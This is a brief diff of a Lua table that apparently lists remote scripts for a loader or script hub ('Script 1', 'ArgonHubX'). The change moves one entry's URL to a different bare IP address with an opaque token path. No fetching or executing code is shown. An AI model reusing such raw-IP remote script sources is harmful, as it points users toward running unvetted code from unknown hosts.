@@ -1,7 +1,7 @@
 local scripts = {
     {
         name = "Script 1",
-        url = "http://72.56.64.162/35ufMCnrdBDUqkq3TQiSdqBWaW5U7tH2g72yJWcObM2qgXrx2uRorhxGxjF4dfcDSqOGQPQpefbBvm13"
+        url = "http://31.172.87.116/35ufMCnrdBDUqkq3TQiSdqBWaW5U7tH2g72yJWcObM2qgXrx2uRorhxGxjF4dfcDSqOGQPQpefbBvm13"
     },
     {
         name = "ArgonHubX",
